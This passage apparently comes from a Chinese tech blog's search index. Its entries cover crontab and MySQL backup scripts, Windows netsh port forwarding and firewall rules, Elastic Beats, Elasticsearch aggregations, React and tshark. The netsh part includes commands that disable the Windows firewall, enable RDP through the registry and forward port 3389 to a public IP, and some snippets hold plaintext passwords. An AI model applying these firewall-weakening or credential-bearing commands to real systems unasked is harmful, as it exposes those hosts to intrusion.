去哪儿？中出现，欢迎前去订阅。本文的主要目的也是为说明IE 中shrink-to-fit bug 做准备。\n\n参考文章：\n\n http://haslayout.net/css-tuts/CSS-Shrink-Wrap\n http://www.brunildo.org/test/shrink-to-fit.html(需翻墙)\n\n题外话：\n\n分享一段话：来自熊培云的《自由在高处》\n\n  在一个广场上，人挤人，你不知道方向在哪里，但如果你站得高一点，看得远一点，就知道周遭的种种拥挤对你来说其实毫无意义。\n\n快过年了，提前祝炖友们过年好，O(∩_∩)O\n\n","tags":null},{"location":"//blog.pytool.com/Post/drone/2016-10-04 Drone支持ansible","title":"drone支持ansible","text":"https://github.com/William-Yeh/docker-ansible.git\n\nrics3n/drone-ansible: Drone plugin for deploying with ansible\n\nrics3n/drone-ansible","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 crontab","title":"Linux命令 crontab","text":"cron服务提供crontab命令来设定cron服务的，以下是这个命令的一些参数与说明：\ncrontab -u //设定某个用户的cron服务，一般root用户在执行这个命令的时候需要此参数\ncrontab -l //列出某个用户cron服务的详细内容\ncrontab -r //删除某个用户的cron服务\ncrontab -e //编辑某个用户的cron服务\n比如说root查看自己的cron设置：crontab -u root -l\n再例如，root想删除fred的cron设置：crontab -u fred -r\n\n每次编辑完某个用户的cron设置后，cron自动在/var/spool/cron下生成一个与此用户同名的文件 ，此用户的cron信息都记录在这个文件中，这个文件是不可以直接编辑的，只可以用crontab -e 来编辑。cron启动后每隔一分钟读一次这个文件，检查是否要执行里面的命令。因此此文件修改后不需要重新启动cron服务。\n\n每天早上5点 备份mysql 数据库\n0 5    docker exec -i yimengmysql mysqldump -uroot -proot --all-databases  /var/www/yimeng/bakup/date -I.sql\n 时间同步\n/10     ntpdate time.asia.apple.com   /dev/null\n\n00 5    docker exec -i mariadb mysqldump -uroot -p --all-databases  /docker/backup/date -I.sql\n00 1 1   docker exec -i mariadb mysqldump -uroot -p --all-databases  /docker/backup/month/date +%Y-%m.sql\n00 1 1   find /docker/backup/ -type f -ctime +30 -exec rm {} \\;\n\n在cron里设置,每周一凌晨2点执行(每周一全备份,其余时间增量备份)\ndefine  \ndayofweek=date \"+%u\"  \ntoday=date \"+%Y%m%d\"  \nsource=/data/  \nbackup=/backup/  \n\n action  \ncd $backup  \n\nif [ $dayofweek -eq 1 ]; then  \n　　if [ ! -f \"full$today.tar.gz\" ]; then  \n　　　　rm -rf snapshot  \n　　　　tar -g snapshot -zcf \"full$today.tar.gz\" $source --exclude $sourceserver.log  \n　　fi  \nelse  \n　　if [ ! -f \"inc$today.tar.gz\" ]; then  \n　　　　tar -g snapshot -zcf \"inc$today.tar.gz\" $source --exclude $sourceserver.log  \n　　fi  \nfi\n\n前一天学习了 at 命令是针对仅运行一次的任务，循环运行的例行性计划任务，linux系统则是由 cron (crond) 这个系统服务来控制的。Linux 系统上面原本就有非常多的计划性工作，因此这个系统服务是默认启动的。另外, 由于使用者自己也可以设置计划任务，所以， Linux 系统也提供了使用者控制计划任务的命令 :crontab 命令。\n\n一、crond简介\ncrond是linux下用来周期性的执行某种任务或等待处理某些事件的一个守护进程，与windows下的计划任务类似，当安装完成操作系统后，默认会安装此服务工具，并且会自动启动crond进程，crond进程每分钟会定期检查是否有要执行的任务，如果有要执行的任务，则自动执行该任务。\nLinux下的任务调度分为两类，系统任务调度和用户任务调度。\n系统任务调度：系统周期性所要执行的工作，比如写缓存数据到硬盘、日志清理等。在/etc目录下有一个crontab文件，这个就是系统任务调度的配置文件。\n/etc/crontab文件包括下面几行：\n\n[root@localhost ~]# cat /etc/crontab\nSHELL=/bin/bash\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\nMAILTO=\"\"\nHOME=/\nrun-parts\n51     root run-parts /etc/cron.hourly\n24 7    root run-parts /etc/cron.daily\n22 4   0 root run-parts /etc/cron.weekly\n42 4 1   root run-parts /etc/cron.monthly\n\n前四行是用来配置crond任务运行的环境变量，\n第一行SHELL变量指定了系统要使用哪个shell，这里是bash，\n第二行PATH变量指定了系统执行命令的路径，\n第三行MAILTO变量指定了crond的任务执行信息将通过电子邮件发送给root用户，如果MAILTO变量的值为空，则表示不发送任务执行信息给用户，\n第四行的HOME变量指定了在执行命令或者脚本时使用的主目录。第六至九行表示的含义将在下个小节详细讲述。这里不在多说。\n用户任务调度：用户定期要执行的工作，比如用户数据备份、定时邮件提醒等。用户可以使用 crontab 工具来定制自己的计划任务。所有用户定义的crontab 文件都被保存在 /var/spool/cron目录中。其文件名与用户名一致。\n\n/etc/cron.deny    该文件中所列用户不允许使用crontab命令\n/etc/cron.allow   该文件中所列用户允许使用crontab命令\n/var/spool/cron/  所有用户crontab文件存放的目录,以用户名命名\n\ncrontab文件的含义：\n用户所建立的crontab文件中，每一行都代表一项任务，每行的每个字段代表一项设置，它的格式共分为六个字段，前五段是时间设定段，第六段是要执行的命令段，格式如下：\nminute   hour   day   month   week   command\n其中：\nminute： 表示分钟，可以是从0到59之间的任何整数。\nhour：   表示小时，可以是从0到23之间的任何整数。\nday：    表示日期，可以是从1到31之间的任何整数。\nmonth：  表示月份，可以是从1到12之间的任何整数。\nweek：   表示星期几，可以是从0到7之间的任何整数，这里的0或7代表星期日。\ncommand：要执行的命令，可以是系统命令，也可以是自己编写的脚本文件。\n\n在以上各个字段中，还可以使用以下特殊字符：\n星号  ：代表所有可能的值，例如month字段如果是星号，则表示在满足其它字段的制约条件后每月都执行该命令操作。\n逗号 , ：可以用逗号隔开的值指定一个列表范围，例如，“1,2,5,7,8,9”\n中杠 - ：可以用整数之间的中杠表示一个整数范围，例如“2-6”表示“2,3,4,5,6”\n正斜线 / ：可以用正斜线指定时间的间隔频率，例如“0-23/2”表示每两小时执行一次。同时正斜线可以和星号一起使用，例如/10，如果用在minute字段，表示每十分钟执行一次。\n\n5．使用实例\n每分钟\n     command\n\n每小时\n0     command\n每小时执行/etc/cron.hourly目录内的脚本\n01                 root run-parts /etc/cron.hourly\n\n每晚的21:30重启smb\n30 21    /etc/init.d/smb restart\n\n实例2：每小时的第3和第15分钟执行\n3,15     command\n\n实例3：在上午8点到11点的第3和第15分钟执行\n3,15 8-11    command\n\n实例4：每隔两天的上午8点到11点的第3和第15分钟执行\n3,15 8-11  /2   command\n\n实例5：每个星期一的上午8点到11点的第3和第15分钟执行\n3,15 8-11   1 command\n\n实例7：每月1、10、22日的4 : 45重启smb\n45 4 1,10,22   /etc/init.d/smb restart\n\n实例8：每周六、周日的1 : 10重启smb\n10 1   6,0 /etc/init.d/smb restart\n\n实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb\n0,30 18-23    /etc/init.d/smb restart\n\n实例10：每星期六的晚上11 : 00 pm重启smb\n0 23   6 /etc/init.d/smb restart\n\n实例12：晚上11点到早上7点之间，每隔一小时重启smb\n命令：\n23-7/1    /etc/init.d/smb restart\n\n实例13：每月的4号与每周一到周三的11点重启smb\n命令：\n0 11 4  mon-wed /etc/init.d/smb restart\n\n实例14：一月一号的4点重启smb\n命令：\n0 4 1 jan  /etc/init.d/smb restart\n\nrun-parts这个参数了，如果去掉这个参数的话，后面就可以写要运行的某个脚本名，而不是目录名了\n\n四、使用注意事项\n注意环境变量问题\n有时我们创建了一个crontab，但是这个任务却无法自动执行，而手动执行这个任务却没有问题，这种情况一般是由于在crontab文件中没有配置环境变量引起的。\n在crontab文件中定义多个调度任务时，需要特别注意的一个问题就是环境变量的设置，因为我们手动执行某个任务时，是在当前shell环境下进行的，程序当然能找到环境变量，而系统自动执行任务调度时，是不会加载任何环境变量的，因此，就需要在crontab文件中指定任务运行所需的所有环境变量，这样，系统执行任务调度时就没有问题了。\n不要假定cron知道所需要的特殊环境，它其实并不知道。所以你要保证在shelll脚本中提供所有必要的路径和环境变量，除了一些自动设置的全局变量。所以注意如下3点：\n1）脚本中涉及文件路径时写全局路径；\n2）脚本执行要用到java或其他环境变量时，通过source命令引入环境变量，如：\ncat startcbp.sh\n!/bin/sh\nsource /etc/profile\nexport RUNCONF=/home/d139/conf/platform/cbp/cbpjboss.conf\n/usr/local/jboss-4.0.5/bin/run.sh -c mev \u0026\n3）当手动执行脚本OK，但是crontab死活不执行时。这时必须大胆怀疑是环境变量惹的祸，并可以尝试在crontab中直接引入环境变量解决问题。如：\n0     . /etc/profile;/bin/sh /var/www/java/auditnocount/bin/restartaudit.sh\n注意清理系统用户的邮件日志\n每条任务调度执行完毕，系统都会将任务输出信息通过电子邮件的形式发送给当前系统用户，这样日积月累，日志信息会非常大，可能会影响系统的正常运行，因此，将每条任务进行重定向处理非常重要。\n例如，可以在crontab文件中设置如下形式，忽略日志输出：\n0 /3    /usr/local/apache2/apachectl restart   /dev/null 2  \u00261\n“/dev/null 2  \u00261”表示先将标准输出重定向到/dev/null，然后将标准错误重定向到标准输出，由于标准输出已经重定向到了/dev/null，因此标准错误也会重定向到/dev/null，这样日志输出问题就解决了。\n系统级任务调度与用户级任务调度\n系统级任务调度主要完成系统的一些维护操作，用户级任务调度主要完成用户自定义的一些任务，可以将用户级任务调度放到系统级任务调度来完成（不建议这么做），但是反过来却不行，root用户的任务调度操作可以通过“crontab –uroot –e”来设置，也可以将调度任务直接写入/etc/crontab文件，需要注意的是，如果要定义一个定时重启系统的任务，就必须将任务放到/etc/crontab文件，即使在root用户下创建一个定时重启系统的任务也是无效的。\n其他注意事项\n新创建的cron job，不会马上执行，至少要过2分钟才执行。如果重启cron则马上执行。\n当crontab突然失效时，可以尝试/etc/init.d/crond restart解决问题。或者查看日志看某个job有没有执行/报错tail -f /var/log/cron。\n千万别乱运行crontab -r。它从Crontab目录（/var/spool/cron）中删除用户的Crontab文件。删除了该用户的所有crontab都没了。\n在crontab中%是有特殊含义的，表示换行的意思。如果要用的话必须进行转义\\%，如经常用的date ‘+%Y%m%d’在crontab里是不会执行的，应该换成date ‘+\\%Y\\%m\\%d’。\n43 21    21:43 执行\n15 05    　　 05:15 执行\n0 17    17:00 执行\n0 17   1 每周一的 17:00 执行\n0,10 17   0,2,3 每周日,周二,周三的 17:00和 17:10 执行\n0-10 17 1   毎月1日从 17:00到7:10 毎隔1分钟 执行\n0 0 1,15  1 毎月1日和 15日和 一日的 0:00 执行\n42 4 1   　 　 毎月1日的 4:42分 执行\n0 21   1-6　　 周一到周六 21:00 执行\n0,10,20,30,40,50    　每隔10分 执行\n/10     　　　　　　 每隔10分 执行\n1   　　　　　　　　 从1:0到1:59 每隔1分钟 执行\n0 1   　　　　　　　　 1:00 执行\n0 /1   　　　　　　　 毎时0分 每隔1小时 执行\n0    　　　　　　　　 毎时0分 每隔1小时 执行\n2 8-20/3   　　　　　　8:02,11:02,14:02,17:02,20:02 执行\n\n30 5 1,15  　　　　　　 1日 和 15日的 5:30 执行\n\n让linux每天定时备份MySQL数据库并删除五天前的备份文件\nMYSQL定期备份是一项重要的工作，但人工操作太繁琐，也难避免有所疏漏，使用下面的方法即可让系统定期备份数据。利用系统crontab来定时执行备份文件，按日期对备份结果进行保存，达到备份的目的。\n\n1、创建备份文件夹\ncd /bak\nmkdir mysqldata  \n\n2、编写运行脚本\nnano -w /usr/sbin/bakmysql.sh\n注：如使用nano编辑此代码需在每行尾添加'\u0026\u0026'或';'连接符，否则生成的文件名末尾字符为乱码\n!/bin/bash\n Name:bakmysql.sh\nThis is a ShellScript For Auto DB Backup and Delete old Backup\n\nbackupdir=/bak/mysqlbak\ntime= date +%Y%m%d%H \nmysqlbindir/mysqldump -u user -ppassword dataname1 | gzip   $backupdir/name1$time.sql.gz\nmysqlbindir/mysqldump -u user -ppassword dataname2 | gzip   $backupdir/name2$time.sql.gz\nfind $backupdir -name \"name.sql.gz\" -type f -mtime +5 -exec rm {} \\;   /dev/null 2  \u00261\nrm -rf find $backupdir -name '.sql.gz' -mtime 10  删除10天前的备份文件\n!/bin/sh\n\nmysqldump -uuser -ppassword dbname | gzip   /var/lib/mysqlbackup/dbnamedate +%Y-%m-%d%H%M%S.sql.gz\n\ncd  /var/lib/mysqlbackup\nrm -rf find . -name '.sql.gz' -mtime 10  删除10天前的备份文件\n保存退出\n\n说明：\n代码中time= date +%Y%m%d%H 也可以写为time=\"$(date +\"%Y%m%d$H\")\"\n其中`符号是TAB键上面的符号，不是ENTER左边的'符号，还有date后要有一个空格。\nmysqlbin_dir：mysql的bin路径；\ndataname：数据库名；\nuser：数据库用户名；\npassword：用户密码；\nname：自定义备份文件前缀标识。\n-type f    表示查找普通类型的文件，f表示普通文件。\n-mtime +5   按照文件的更改时间来查找文件，+5表示文件更改时间距现在5天以前；如果是 -mmin +5 表示文件更改时间距现在5分钟以前。\n-exec rm {} \\;   表示执行一段shell命令，exec选项后面跟随着所要执行的命令或脚本，然后是一对儿{ }，一个空格和一个\\，最后是一个分号。\n/dev/null 2  \u00261  把标准出错重定向到标准输出，然后扔到/DEV/NULL下面去。通俗的说，就是把所有标准输出和标准出错都扔到垃圾桶里面；其中的\u0026 表示让该命令在后台执行。\n\n3、为脚本添加执行权限\nchmod +x /usr/sbin/bakmysql.sh\n\n4、修改/etc/crontab（在centOS5中测试可行）\nnano -w /etc/crontab  \n在最后一行中加入：  \n00 3    root /usr/sbin/bakmysql.sh\n表示每天3点00分执行备份\n\n注：crontab配置文件格式如下：\n分　时　日　月　周　 命令\n\nRedhat方法：\nRedhat的crontab采用按时间调用4个目录（/etc/cron.hourly：每小时；/etc/cron.daily：每天；/etc/cron.weekly：每周；/etc/cron.monthly：每月）中脚本出来运行的方式。\nRedhat中只需要将刚才编辑的脚本复制到相应的目录即可。\n\n5、重启crontab\n/etc/rc.d/init.d/crond restart  \n完成。  \n\n6、恢复数据备份文件：\n\n非压缩备份文件恢复：\n   mysql -u root -p dataname \u003c name2008010103.sql\n\n从压缩文件直接恢复：\n   #gzip \u003c name2008010103.sql.gz | mysql -u root -p dataname\n或：\nzcat name2008010103.sql.gz  | mysql -u root -p","tags":null},{"location":"//blog.pytool.com/cmd/2015-01-01 Linux 常用脚本","title":"Linux 常用脚本","text":"","tags":null},{"location":"//blog.pytool.com/cmd/2016-06-01 Linux命令 bower","title":"强大的管理web包管理工具 bower","text":"先安装bower(确保先有node环境) \nnpm install bower -g","tags":null},{"location":"//blog.pytool.com/cmd/2015-01-01 Windows命令 netsh","title":"Windows命令 netsh","text":"添加转发\n\n    netsh interface portproxy add v4tov4 转发端口 目标IP 目标端口\n    或者\n    netsh interface portproxy add v4tov4 listenport=转发端口 listenaddress=本机IP connectport=目标端口 connectaddress=目标IP\n\n查看转发\n\nnetsh interface portproxy show all\n\n删除转发\nnetsh interface portproxy delete v4tov4 listenport=转发端口\n或者\nnetsh interface portproxy delete v4tov4 listenport=转发端口 listenaddress=本机IP\n\nwindows命令行下用netsh实现端口转发(端口映射)\n首先安装IPV6（xp、2003下IPV6必须安装，否则端口转发不可用！）\nnetsh interface ipv6 install\n查看转发配置：\nnetsh interface portproxy show all\n将本机22到 1.1.1.1的22：\nnetsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=22 connectaddress=1.1.1.1 connectport=22\n删除配置：\nnetsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=22\n添加防火墙规则，允许连接22：\nnetsh firewall set portopening protocol=tcp port=22 name=Forward mode=enable scope=all profile=all\n\n例如：listenaddress=192.168.193.1，参数可以省略，如果省略，则监听本地所有IP地址。\n\n添加：netsh interface portproxy add v4tov4 listenport=88 connectaddress=127.0.0.1 connectport=80\n删除：netsh interface portproxy delete v4tov4 listenport=88\n\n批量添加：for /l %i in (100,1,200) do @netsh interface portproxy add v4tov4 listenport=%i connectaddress=www.baidu.com connectport=80\n全部删除：for /f \"skip=5 tokens=2 \" %i in ('netsh interface portproxy show all') do @netsh interface portproxy delete v4tov4 listenport=%i\n\n Netsh 进行高级的 Windows 防火墙操作\n//给防火墙添加允许 TCP 3389 端口通过\nnetsh advfirewall firewall add rule name=Windows Security Port dir=in action=allow protocol=TCP localport=3389\n\n//删除防火墙所有针对 TCP 8080 端口入站的规则\nnetsh advfirewall firewall delete rule name=all dir=in protocol=TCP localport=8080\n\n//直接重设防火墙策略到默认状态\nnetsh advfirewall reset\n\n//关闭防火墙所有规则\nnetsh advfirewall set allprofiles state off\n\n//将入站默认规则设置成阻挡并允许出站\nnetsh advfirewall set allprofiles firewallpolicy blackinbound,allowoutbound\n\n//将本地的3389端口的数据转发至公网IP上的8080端口\nnetsh interface portproxy add v4tov4 listenport=3389 connectaddress=公网IP connectport=8080\n\n//将本地3389端口的数据改成转发至公网IP的9080端口\nnetsh interface portproxy set v4tov4 listenport=3389 connectaddress=公网IP connectport=9080\n\n//显示所有IPv4端口代理参数\nnetsh interface portproxy show v4tov4\n\n//删除本地端口3389的端口转发配置\nnetsh interface portproxy delete v4tov4 listenport=3389\n\n封锁指定IP：\nnetsh advfirewall firewall add rule name=\"BLOCKDWS\" dir=in interface=any action=block remoteip=111.221.29.177\nnetsh advfirewall firewall add rule name=\"BLOCKDWS\" dir=out interface=any action=block remoteip=111.221.29.177\nnetsh advfirewall firewall add rule name=\"Remote Desktop Services\" protocol=TCP dir=in localport=%port% action=allow\nnetsh advfirewall firewall add rule name=\"CMS RTSP\" protocol=TCP dir=in localport=554 action=allow\nnetsh advfirewall firewall add rule name=\"EasyDarwin RTSP\" protocol=TCP dir=in localport=8554 action=allow\n开启 RDP 服务\nreg add \"hklm\\system\\currentcontrolset\\control\\terminal server\" /f /v fDenyTSConnections /t REG_DWORD /d 0\nnetsh firewall set service remoteadmin enable\nnetsh firewall set service remotedesktop enable\n关闭 Windows 防火墙\nnetsh firewall set opmode disable\n\n（1）启用桌面防火墙\nnetsh advfirewall set allprofiles state on\n（2）设置默认输入和输出策略\nnetsh advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound\n以上是设置为允许，如果设置为拒绝使用blockinbound,blockoutbound\n（3）关闭tcp协议的139端口\nnetsh advfirewall firewall add rule name=\"deny tcp 139\" dir=in protocol=tcp localport=139 action=block\n（4）关闭udp协议的139端口\nnetsh advfirewall firewall add rule name=\"deny udp 139\" dir=in protocol=udp localport=139 action=block\n（5）关闭tcp协议的445端口\nnetsh advfirewall firewall add rule name=\"deny tcp 445\" dir=in protocol=tcp localport=445 action=block\n（6）关闭udp协议的445端口\nnetsh advfirewall firewall add rule name=\"deny udp 445\" dir=in protocol=udp localport=445 action=block\n（7）使用相同的方法，依次关闭TCP协议的21、22、23、137、138、3389、5800、5900端口。\nnetsh advfirewall firewall add rule name= \"deny tcp 21\" dir=in protocol=tcp localport=21 action=block\nnetsh advfirewall firewall add rule name= \"deny tcp 22\" dir=in protocol=tcp localport=22 action=block\nnetsh advfirewall firewall add rule name= \"deny tcp 23\" dir=in protocol=tcp localport=23 action=block\nnetsh advfirewall firewall add rule name= \"deny tcp 3389\" dir=in protocol=tcp localport=3389 action=block\nnetsh advfirewall firewall add rule name= \"deny tcp 5800\" dir=in protocol=tcp localport=5800 action=block\nnetsh advfirewall firewall add rule name= \"deny tcp 5900\" dir=in protocol=tcp localport=5900 action=block\nnetsh advfirewall firewall add rule name= \"deny tcp 137\" dir=in protocol=tcp localport=137 action=block\nnetsh advfirewall firewall add rule name= \"deny tcp 138\" dir=in protocol=tcp localport=138 action=block\n（8）执行完毕后暂停\npause\necho 按任意键退出\n2．恢复初始配置\n（1）恢复初始防火墙设置\nnetsh advfirewall reset\n（2）关闭防火墙\nnetsh advfirewall set allprofiles state off","tags":null},{"location":"//blog.pytool.com/Post/Elastic/beats/2016-10-04 Beats开发指南","title":"Beats开发指南","text":"创建beat项目\npython $GOPATH/src/github.com/elastic/beats/script/generate.py\n\n安装环境依赖\ncd ${GOPATH}/src/github.com/{user}/mybeat\nmake setup\n\n编译 运行\nmake\n./countbeat -e -d \"*\"\n\n导入 dashboards\n\n   ./scripts/importdashboards -dir kibana/metricbeat\n    ./scripts/importdashboards -file metricbeat-dashboards-1.1.zip\n    ./scripts/importdashboards -url https://artifacts.elastic.co/downloads/beats/beats-dashboards/beats-dashboards-5.4.1.zip\n    ./scripts/importdashboards -es http://120.92.36.21:9200 -user elastic -pass changeme\n          beats/libbeat/dashboards/importdashboards -beat metricbeat\n  indexpattern   ./scripts/importdashboards -only-index\n  dashboards  ./scripts/importdashboards -only-dashboards\n\ndocker run --rm -it docker.elastic.co/beats/heartbeat:5.4.0 /usr/share/heartbeat/scripts/importdashboards -beat \"heartbeat\"  -file /usr/share/heartbeat/beats-dashboards-5.4.0.zip  -es http://139.129.234.31:9200  -user elastic   -pass changeme\n\n根据 meta/fields.yml 生成indexpattern\n  make update\n\n   根据 fields.yaml 导入elastic template\n      output.elasticsearch:\n      hosts: [\"localhost:9200\"]\n      template.name: \"metricbeat\"\n      template.fields: \"fields.yml\"\n      template.overwrite: false\n   导出\nESURL=\"http://192.168.3.206:9200\" make export-dashboards\n\n打包 dashboards\nmake package-dashboards","tags":null},{"location":"//blog.pytool.com/Post/Elastic/ElasticSearch/2016-10-04 [Elasticsearch] 聚合中的重要概念 - Buckets(桶)及Metrics(指标)","title":"聚合中的重要概念 - Buckets(桶)及Metrics(指标)","text":"本章翻译自Elasticsearch官方指南的Aggregations-High-level Concepts一章。\n\nhttp://blog.csdn.net/dm_vincent/article/details/42387161\n\n高层概念(High-Level Concepts)\n\n和查询DSL一样，聚合(Aggregations)也拥有一种可组合(Composable)的语法：独立的功能单元可以被混合在一起来满足你的需求。这意味着需要学习的基本概念虽然不多，但是它们的组合方式是几近无穷的。\n\n为了掌握聚合，你只需要了解两个主要概念：\n\nBuckets(桶)：\n\n满足某个条件的文档集合。\n\nMetrics(指标)：\n\n为某个桶中的文档计算得到的统计信息。\n\n就是这样！每个聚合只是简单地由一个或者多个桶，零个或者多个指标组合而成。可以将它粗略地转换为SQL：\n\nSELECT COUNT(color)\nFROM table\nGROUP BY color\n\n以上的COUNT(color)就相当于一个指标。GROUP BY color则相当于一个桶。\n\n桶和SQL中的组(Grouping)拥有相似的概念，而指标则与COUNT()，SUM()，MAX()等相似。\n\n让我们仔细看看这些概念。\n\n桶(Buckets)\n\n一个桶就是满足特定条件的一个文档集合：\n\n    一名员工要么属于男性桶，或者女性桶。\n    城市Albany属于New York州这个桶。\n    日期2014-10-28属于十月份这个桶。\n\n随着聚合被执行，每份文档中的值会被计算来决定它们是否匹配了桶的条件。如果匹配成功，那么该文档会被置入该桶中，同时聚合会继续执行。\n\n桶也能够嵌套在其它桶中，能让你完成层次或者条件划分这些需求。比如，Cincinnati可以被放置在Ohio州这个桶中，而整个Ohio州则能够被放置在美国这个桶中。\n\nES中有很多类型的桶，让你可以将文档通过多种方式进行划分(按小时，按最流行的词条，按年龄区间，按地理位置，以及更多)。但是从根本上，它们都根据相同的原理运作：按照条件对文档进行划分。\n\n指标(Metrics)\n\n桶能够让我们对文档进行有意义的划分，但是最终我们还是需要对每个桶中的文档进行某种指标计算。分桶是达到最终目的的手段：提供了对文档进行划分的方法，从而让你能够计算需要的指标。\n\n多数指标仅仅是简单的数学运算(比如，min，mean，max以及sum)，它们使用文档中的值进行计算。在实际应用中，指标能够让你计算例如平均薪资，最高出售价格，或者百分之95的查询延迟。\n\n将两者结合起来\n\n一个聚合就是一些桶和指标的组合。一个聚合可以只有一个桶，或者一个指标，或者每样一个。在桶中甚至可以有多个嵌套的桶。比如，我们可以将文档按照其所属国家进行分桶，然后对每个桶计算其平均薪资(一个指标)。\n\n因为桶是可以嵌套的，我们能够实现一个更加复杂的聚合操作：\n\n    将文档按照国家进行分桶。(桶)\n    然后将每个国家的桶再按照性别分桶。(桶)\n    然后将每个性别的桶按照年龄区间进行分桶。(桶)\n    最后，为每个年龄区间计算平均薪资。(指标)\n\n此时，就能够得到每个国家，性别，年龄组合的平均薪资信息了。它可以通过一个请求，一次数据遍历来完成！","tags":null},{"location":"//blog.pytool.com/Post/前端技术/2016-03-29 一看就懂的ReactJs入门教程","title":"一看就懂的ReactJs入门教程","text":"一看就懂的ReactJs入门教程（精华版）\n现在最热门的前端框架有AngularJS、React、Bootstrap等。自从接触了ReactJS，ReactJs的虚拟DOM（Virtual DOM）和组件化的开发深深的吸引了我，下面来跟我一起领略\nReactJS的风采吧 章有点长，耐心读完，你会有很大收获哦~\n\n一、ReactJS简介\n\nReact 起源于 Facebook 的内部项目，因为该公司对市场上所有 JavaScript MVC 框架，都不满意，就决定自己写一套，用来架设 Instagram 的网站。做出来以后，发现这套东西很好用，就在2013年5月开源了。由于 React 的设计思想极其独特，属于革命性创新，性能出众，代码逻辑却非常简单。所以，越来越多的人开始关注和使用，认为它可能是将来 Web 开发的主流工具。\n\nReactJS官网地址：http://facebook.github.io/react/\n\nGithub地址：https://github.com/facebook/react\n\n二、对ReactJS的认识及ReactJS的优点\n\n首先，对于React，有一些认识误区，这里先总结一下：\n\n    React不是一个完整的MVC框架，最多可以认为是MVC中的V（View），甚至React并不非常认可MVC开发模式；\n\n    React的服务器端Render能力只能算是一个锦上添花的功能，并不是其核心出发点，事实上React官方站点几乎没有提及其在服务器端的应用；\n\n    有人拿React和Web Component相提并论，但两者并不是完全的竞争关系，你完全可以用React去开发一个真正的Web Component；\n\n    React不是一个新的模板语言，JSX只是一个表象，没有JSX的React也能工作。\n\n1、ReactJS的背景和原理\n\n在Web开发中，我们总需要将变化的数据实时反应到UI上，这时就需要对DOM进行操作。而复杂或频繁的DOM操作通常是性能瓶颈产生的原因（如何进行高性能的复杂DOM操作通常是衡量一个前端开发人员技能的重要指标）。React为此引入了虚拟DOM（Virtual DOM）的机制：在浏览器端用Javascript实现了一套DOM API。基于React进行开发时所有的DOM构造都是通过虚拟DOM进行，每当数据变化时，React都会重新构建整个DOM树，然后React将当前整个DOM树和上一次的DOM树进行对比，得到DOM结构的区别，然后仅仅将需要变化的部分进行实际的浏览器DOM更新。而且React能够批处理虚拟DOM的刷新，在一个事件循环（Event Loop）内的两次数据变化会被合并，例如你连续的先将节点内容从A变成B，然后又从B变成A，React会认为UI不发生任何变化，而如果通过手动控制，这种逻辑通常是极其复杂的。尽管每一次都需要构造完整的虚拟DOM树，但是因为虚拟DOM是内存数据，性能是极高的，而对实际DOM进行操作的仅仅是Diff部分，因而能达到提高性能的目的。这样，在保证性能的同时，开发者将不再需要关注某个数据的变化如何更新到一个或多个具体的DOM元素，而只需要关心在任意一个数据状态下，整个界面是如何Render的。\n\n如果你像在90年代那样写过服务器端Render的纯Web页面那么应该知道，服务器端所要做的就是根据数据Render出HTML送到浏览器端。如果这时因为用户的一个点击需要改变某个状态文字，那么也是通过刷新整个页面来完成的。服务器端并不需要知道是哪一小段HTML发生了变化，而只需要根据数据刷新整个页面。换句话说，任何UI的变化都是通过整体刷新来完成的。而React将这种开发模式以高性能的方式带到了前端，每做一点界面的更新，你都可以认为刷新了整个页面。至于如何进行局部更新以保证性能，则是React框架要完成的事情。\n\n借用Facebook介绍React的视频中聊天应用的例子，当一条新的消息过来时，传统开发的思路如上图，你的开发过程需要知道哪条数据过来了，如何将新的DOM结点添加到当前DOM树上；而基于React的开发思路如下图，你永远只需要关心数据整体，两次数据之间的UI如何变化，则完全交给框架去做。可以看到，使用React大大降低了逻辑复杂性，意味着开发难度降低，可能产生Bug的机会也更少。\n\n2、组件化\n\n虚拟DOM(virtual-dom)不仅带来了简单的UI开发逻辑，同时也带来了组件化开发的思想，所谓组件，即封装起来的具有独立功能的UI部件。React推荐以组件的方式去重新思考UI构成，将UI上每一个功能相对独立的模块定义成组件，然后将小的组件通过组合或者嵌套的方式构成大的组件，最终完成整体UI的构建。例如，Facebook的instagram.com整站都采用了React来开发，整个页面就是一个大的组件，其中包含了嵌套的大量其它组件，大家有兴趣可以看下它背后的代码。\n\n如果说MVC的思想让你做到视图-数据-控制器的分离，那么组件化的思考方式则是带来了UI功能模块之间的分离。我们通过一个典型的Blog评论界面来看MVC和组件化开发思路的区别。\n\n对于MVC开发模式来说，开发者将三者定义成不同的类，实现了表现，数据，控制的分离。开发者更多的是从技术的角度来对UI进行拆分，实现松耦合。\n\n对于React而言，则完全是一个新的思路，开发者从功能的角度出发，将UI分成不同的组件，每个组件都独立封装。\n\n在React中，你按照界面模块自然划分的方式来组织和编写你的代码，对于评论界面而言，整个UI是一个通过小组件构成的大组件，每个组件只关心自己部分的逻辑，彼此独立。\n\n072132381261891600.jpg\n\nReact认为一个组件应该具有如下特征：\n（1）可组合（Composeable）：一个组件易于和其它组件一起使用，或者嵌套在另一个组件内部。如果一个组件内部创建了另一个组件，那么说父组件拥有（own）它创建的子组件，通过这个特性，一个复杂的UI可以拆分成多个简单的UI组件；\n\n（2）可重用（Reusable）：每个组件都是具有独立功能的，它可以被使用在多个UI场景；\n\n（3）可维护（Maintainable）：每个小的组件仅仅包含自身的逻辑，更容易被理解和维护；\n\n三、下载ReactJS，编写Hello，world","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 wireshark tshark","title":"tshark","text":"CaptureFilters - The Wireshark Wiki\nManpage of PCAP-FILTER\ntshark命令「电脑玩物」中文网我们只是「电脑玩物」 -\n\n在Linux下，当我们需要抓取网络数据包分析时，通常是使用tcpdump抓取网络raw数据包存到一个文件，然后下载到本地使用wireshark界面网络分析工具进行网络包分析。\n最近才发现，原来wireshark也提供有Linux 命令行工具-tshark。tshark不仅有抓包的功能，还带了解析各种协议的能力。下面我们以两个实例来介绍tshark工具。\n\n主要参数：\n\n抓包接口类\n-i 设置抓包的网络接口，不设置则默认为第一个非自环接口。\n-D 列出当前存在的网络接口。在不了解OS所控制的网络设备时，一般先用“tshark -D”查看网络接口的编号以供-i参数使用。\n\n   控制参数\n-s 设置每个抓包的大小，默认为65535，多于这个大小的数据将不会被程序记入内存、写入文件。（这个参数相当于tcpdump的-s，tcpdump默认抓包的大小仅为68）\n-p 